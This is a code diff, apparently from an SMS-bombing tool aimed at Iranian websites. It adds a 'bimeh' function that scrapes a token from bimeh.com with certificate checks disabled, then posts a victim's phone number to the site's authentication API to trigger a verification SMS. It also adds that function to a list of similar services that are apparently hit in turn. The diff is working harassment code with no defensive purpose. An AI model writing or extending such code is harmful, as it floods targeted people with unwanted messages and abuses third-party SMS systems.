@@ -129,13 +129,25 @@ def ibime(phone):
     except Exception as e:
         print(f"Error: {e}")
 
-
+def bimeh(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        s = requests.Session()
+        h = {'User-Agent': 'Mozilla/5.0'}
+        token = re.search(r'token["\']\s*[:=]\s*["\']([^"\']+)["\']', s.get("https://bimeh.com/", headers=h, timeout=10, verify=False).text)
+        if not token: return False
+        r = s.post("https://coreapi.bimeh.com/v1/authentication", json={"MobileNumber": phone}, headers={**h, 'Token': token.group(1), 'Origin': 'https://bimeh.com'}, timeout=10, verify=False)
+        print(f"Status: {r.status_code} | Response: {r.text}")
+        return r.status_code == 200
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
         
 # ==========================
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh
 ]
 
 # ==========================
